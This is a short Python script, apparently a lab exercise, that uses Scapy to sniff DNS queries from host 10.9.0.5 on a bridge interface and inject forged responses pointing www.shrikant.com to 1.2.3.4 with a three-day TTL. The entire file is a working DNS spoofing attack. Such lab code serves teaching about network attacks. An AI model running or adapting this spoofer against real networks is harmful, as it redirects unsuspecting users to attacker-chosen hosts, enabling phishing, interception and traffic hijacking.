#!/usr/bin/python3
from scapy. all import *
def spoof_dns (pkt) :

    if(DNS in pkt and 'www.shrikant.com' in pkt[DNS].qd.qname.decode("utf-8")):
        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
        UDPpkt = UDP (dport=pkt[UDP].sport, sport=53)
        Anssec = DNSRR( rrname=pkt[DNS].qd.qname, type='A' , rdata='1.2.3.4', ttl=259200)

        DNSpkt = DNS (id=pkt[DNS].id, qd=pkt[DNS].qd,aa=1, rd=0, qdcount=1, qr=1, ancount=1, an=Anssec)
        spoofpkt = IPpkt/UDPpkt/DNSpkt
        send ( spoofpkt ,iface='br-84e098e0707d')
        
pkt=sniff(filter='udp and (src host 10.9.0.5 and dst port 53) ', prn=spoof_dns,iface='br-84e098e0707d')
